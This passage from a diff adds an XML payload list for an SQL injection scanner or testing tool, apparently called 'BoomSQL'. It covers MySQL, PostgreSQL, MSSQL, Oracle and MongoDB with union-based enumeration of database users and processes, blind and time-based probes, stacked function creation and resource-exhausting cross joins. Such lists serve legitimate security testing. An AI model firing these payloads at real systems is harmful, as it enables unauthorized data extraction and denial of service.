+  
+  <payload title="Time - Recursive multiplication" risk="4" platform="mysql" category="time">
+    <![CDATA[' AND (SELECT SLEEP(IF((SELECT @result:=@result*2 FROM (SELECT @result:=1) x, information_schema.tables LIMIT 20), 5, 0))) --]]>
+  </payload>
+  
+  <payload title="Time - String iteration" risk="4" platform="mysql" category="time">
+    <![CDATA[' AND (SELECT SLEEP(IF((SELECT LENGTH(GROUP_CONCAT(table_name)) FROM information_schema.tables) > 1000, 5, 0))) --]]>
+  </payload>
+  
+  <!-- Advanced Union-based with System Information -->
+  <payload title="Union - Current database info" risk="3" platform="mysql" category="union">
+    <![CDATA[' UNION SELECT 1,DATABASE(),USER() --]]>
+  </payload>
+  
+  <payload title="Union - System variables" risk="3" platform="mysql" category="union">
+    <![CDATA[' UNION SELECT 1,@@datadir,@@tmpdir --]]>
+  </payload>
+  
+  <payload title="Union - Process information" risk="3" platform="mysql" category="union">
+    <![CDATA[' UNION SELECT 1,id,info FROM information_schema.processlist --]]>
+  </payload>
+  
+  <payload title="Union - Plugin information" risk="3" platform="mysql" category="union">
+    <![CDATA[' UNION SELECT 1,plugin_name,plugin_status FROM information_schema.plugins --]]>
+  </payload>
+  
+  <payload title="Union - Engine information" risk="3" platform="mysql" category="union">
+    <![CDATA[' UNION SELECT 1,engine,support FROM information_schema.engines --]]>
+  </payload>
+  
+  <!-- Advanced Error-based with Mathematical Functions -->
+  <payload title="Error - Division by zero" risk="4" platform="mysql" category="error">
+    <![CDATA[' AND (SELECT 1/0 FROM dual WHERE version() LIKE '%mysql%') --]]>
+  </payload>
+  
+  <payload title="Error - Logarithm of zero" risk="4" platform="mysql" category="error">
+    <![CDATA[' AND (SELECT LOG(0) FROM dual WHERE database() != '') --]]>
+  </payload>
+  
+  <payload title="Error - Square root negative" risk="4" platform="mysql" category="error">
+    <![CDATA[' AND (SELECT SQRT(-1) FROM dual WHERE user() LIKE 'root%') --]]>
+  </payload>
+  
+  <payload title="Error - Overflow error" risk="4" platform="mysql" category="error">
+    <![CDATA[' AND (SELECT EXP(999) FROM dual WHERE 1=1) --]]>
+  </payload>
+  
+  <payload title="Error - Invalid date format" risk="4" platform="mysql" category="error">
+    <![CDATA[' AND (SELECT DATE('invalid') FROM dual WHERE version() != '') --]]>
+  </payload>
+  
+  <!-- Advanced Stacked Queries for Local Operations -->
+  <payload title="Stacked - Variable assignment" risk="4" platform="mysql" category="stacked">
+    <![CDATA['; SET @payload = CONCAT(database(), ':', user()); SELECT @payload --]]>
+  </payload>
+  
+  <payload title="Stacked - Temporary table" risk="4" platform="mysql" category="stacked">
+    <![CDATA['; CREATE TEMPORARY TABLE temp_data AS SELECT * FROM information_schema.tables --]]>
+  </payload>
+  
+  <payload title="Stacked - Function creation" risk="5" platform="mysql" category="stacked">
+    <![CDATA['; DELIMITER //; CREATE FUNCTION get_data() RETURNS VARCHAR(255) READS SQL DATA RETURN (SELECT version()) //; DELIMITER ; --]]>
+  </payload>
+  
+  <payload title="Stacked - Procedure creation" risk="5" platform="mysql" category="stacked">
+    <![CDATA['; DELIMITER //; CREATE PROCEDURE show_data() BEGIN SELECT database(), user(), version(); END //; DELIMITER ; --]]>
+  </payload>
+  
+  <!-- Advanced NoSQL Local Operations -->
+  <payload title="NoSQL - MongoDB aggregation" risk="4" platform="mongodb" category="nosql">
+    <![CDATA[{"$expr": {"$gt": [{"$size": "$field"}, 0]}}]]>
+  </payload>
+  
+  <payload title="NoSQL - MongoDB text search" risk="3" platform="mongodb" category="nosql">
+    <![CDATA[{"$text": {"$search": "admin"}}]]>
+  </payload>
+  
+  <payload title="NoSQL - MongoDB array manipulation" risk="4" platform="mongodb" category="nosql">
+    <![CDATA[{"field": {"$push": {"$each": ["value1", "value2"]}}}]]>
+  </payload>
+  
+  <payload title="NoSQL - MongoDB field projection" risk="3" platform="mongodb" category="nosql">
+    <![CDATA[{"$project": {"sensitive_field": 1, "_id": 0}}]]>
+  </payload>
+  
+  <!-- Advanced PostgreSQL Specific Payloads -->
+  <payload title="PostgreSQL - Array operations" risk="3" platform="postgresql" category="array">
+    <![CDATA[' AND (SELECT array_length(string_to_array(version(), ' '), 1) > 0) --]]>
+  </payload>
+  
+  <payload title="PostgreSQL - JSON operations" risk="3" platform="postgresql" category="json">
+    <![CDATA[' AND (SELECT json_extract_path_text('{"key":"value"}', 'key') = 'value') --]]>
+  </payload>
+  
+  <payload title="PostgreSQL - Window functions" risk="3" platform="postgresql" category="window">
+    <![CDATA[' AND (SELECT row_number() OVER (ORDER BY tablename) FROM pg_tables LIMIT 1) --]]>
+  </payload>
+  
+  <payload title="PostgreSQL - Regex operations" risk="3" platform="postgresql" category="regex">
+    <![CDATA[' AND (SELECT version() ~ '^PostgreSQL') --]]>
+  </payload>
+  
+  <!-- Advanced MSSQL Specific Payloads -->
+  <payload title="MSSQL - Common Table Expressions" risk="4" platform="mssql" category="cte">
+    <![CDATA['; WITH Numbers AS (SELECT 1 AS n UNION ALL SELECT n+1 FROM Numbers WHERE n < 100) SELECT COUNT(*) FROM Numbers --]]>
+  </payload>
+  
+  <payload title="MSSQL - XML operations" risk="4" platform="mssql" category="xml">
+    <![CDATA[' AND (SELECT @@version FOR XML PATH('')) --]]>
+  </payload>
+  
+  <payload title="MSSQL - Pivot operations" risk="3" platform="mssql" category="pivot">
+    <![CDATA[' AND (SELECT COUNT(*) FROM (SELECT * FROM sysobjects PIVOT (COUNT(id) FOR xtype IN ([U], [S])) AS p) x) --]]>
+  </payload>
+  
+  <payload title="MSSQL - String manipulation" risk="3" platform="mssql" category="string">
+    <![CDATA[' AND (SELECT STUFF(@@version, 1, 0, 'Modified: ')) --]]>
+  </payload>
+  
+  <!-- Advanced Oracle Specific Payloads -->
+  <payload title="Oracle - Hierarchical queries" risk="4" platform="oracle" category="hierarchical">
+    <![CDATA[' AND (SELECT LEVEL FROM dual CONNECT BY LEVEL <= 10) --]]>
+  </payload>
+  
+  <payload title="Oracle - Analytical functions" risk="3" platform="oracle" category="analytical">
+    <![CDATA[' AND (SELECT RANK() OVER (ORDER BY table_name) FROM user_tables WHERE rownum=1) --]]>
+  </payload>
+  
+  <payload title="Oracle - Regular expressions" risk="3" platform="oracle" category="regex">
+    <![CDATA[' AND (SELECT REGEXP_SUBSTR(banner, '[0-9]+') FROM v$version WHERE rownum=1) --]]>
+  </payload>
+  
+  <payload title="Oracle - XML operations" risk="4" platform="oracle" category="xml">
+    <![CDATA[' AND (SELECT XMLSerialize(CONTENT XMLElement("version", banner)) FROM v$version WHERE rownum=1) --]]>
+  </payload>
+  
+  <!-- Advanced Blind Injection Techniques -->
+  <payload title="Blind - Character enumeration" risk="4" platform="mysql" category="blind">
+    <![CDATA[' AND (SELECT ASCII(SUBSTRING((SELECT schema_name FROM information_schema.schemata LIMIT 1),1,1)) BETWEEN 65 AND 90) --]]>
+  </payload>
+  
+  <payload title="Blind - Binary search" risk="4" platform="mysql" category="blind">
+    <![CDATA[' AND (SELECT LENGTH((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables)) > 500) --]]>
+  </payload>
+  
+  <payload title="Blind - Conditional existence" risk="3" platform="mysql" category="blind">
+    <![CDATA[' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = database()) > 5 --]]>
+  </payload>
+  
+  <payload title="Blind - Pattern matching" risk="3" platform="mysql" category="blind">
+    <![CDATA[' AND (SELECT table_name FROM information_schema.tables WHERE table_name LIKE 'user%' LIMIT 1) != '' --]]>
+  </payload>
+  
+  <!-- Advanced Memory and Performance Attacks -->
+  <payload title="Memory - Large string creation" risk="4" platform="mysql" category="memory">
+    <![CDATA[' AND (SELECT REPEAT(CHAR(65), 1000000)) --]]>
+  </payload>
+  
+  <payload title="Memory - Recursive concatenation" risk="4" platform="mysql" category="memory">
+    <![CDATA[' AND (SELECT @str:=CONCAT(@str, CHAR(65)) FROM (SELECT @str:='') x, information_schema.tables LIMIT 10000) --]]>
+  </payload>
+  
+  <payload title="Memory - Table multiplication" risk="4" platform="mysql" category="memory">
+    <![CDATA[' AND (SELECT COUNT(*) FROM information_schema.tables t1, information_schema.tables t2, information_schema.tables t3) --]]>
+  </payload>
+  
+  <!-- Advanced Encoding and Obfuscation -->
+  <payload title="Encoding - Hex string manipulation" risk="3" platform="mysql" category="encoding">
+    <![CDATA[' AND (SELECT UNHEX('76657273696F6E') = 'version') --]]>
+  </payload>
+  
+  <payload title="Encoding - Base64 operations" risk="3" platform="mysql" category="encoding">
+    <![CDATA[' AND (SELECT TO_BASE64(version())) --]]>
+  </payload>
+  
+  <payload title="Encoding - Character set conversion" risk="3" platform="mysql" category="encoding">
+    <![CDATA[' AND (SELECT CONVERT(version() USING utf8)) --]]>
+  </payload>
+  
+  <payload title="Encoding - Binary operations" risk="3" platform="mysql" category="encoding">
+    <![CDATA[' AND (SELECT BIN(ASCII(SUBSTRING(version(),1,1)))) --]]>
+  </payload>
+  
+  <!-- Advanced Date and Time Manipulation -->
+  <payload title="DateTime - Timestamp extraction" risk="3" platform="mysql" category="datetime">
+    <![CDATA[' AND (SELECT UNIX_TIMESTAMP() > 1000000000) --]]>
+  </payload>
+  
+  <payload title="DateTime - Date arithmetic" risk="3" platform="mysql" category="datetime">
+    <![CDATA[' AND (SELECT DATEDIFF(NOW(), '1970-01-01') > 15000) --]]>
+  </payload>
+  
+  <payload title="DateTime - Time zone manipulation" risk="3" platform="mysql" category="datetime">
+    <![CDATA[' AND (SELECT CONVERT_TZ(NOW(), @@session.time_zone, '+00:00')) --]]>
+  </payload>
+  
+  <payload title="DateTime - Calendar functions" risk="3" platform="mysql" category="datetime">
+    <![CDATA[' AND (SELECT DAYOFWEEK(NOW()) BETWEEN 1 AND 7) --]]>
+  </payload>
+  
+  <!-- Advanced Mathematical Operations -->
+  <payload title="Math - Trigonometric functions" risk="3" platform="mysql" category="math">
+    <![CDATA[' AND (SELECT SIN(PI()/2) = 1) --]]>
+  </payload>
+  
+  <payload title="Math - Logarithmic calculations" risk="3" platform="mysql" category="math">
+    <![CDATA[' AND (SELECT LOG10(1000) = 3) --]]>
+  </payload>
+  
+  <payload title="Math - Statistical functions" risk="3" platform="mysql" category="math">
+    <![CDATA[' AND (SELECT STDDEV(ASCII(table_name)) FROM information_schema.tables) --]]>
+  </payload>
+  
+  <payload title="Math - Random number generation" risk="3" platform="mysql" category="math">
+    <![CDATA[' AND (SELECT FLOOR(RAND() * 1000) BETWEEN 0 AND 999) --]]>
+  </payload>
+  
+  <!-- Final comprehensive test payload -->
+  <payload title="Final comprehensive test" risk="1" platform="generic" category="final">
+    <![CDATA[' AND 1=1 AND 'BoomSQL'='BoomSQL' --]]>
+  </payload>
+  
+</payloads>
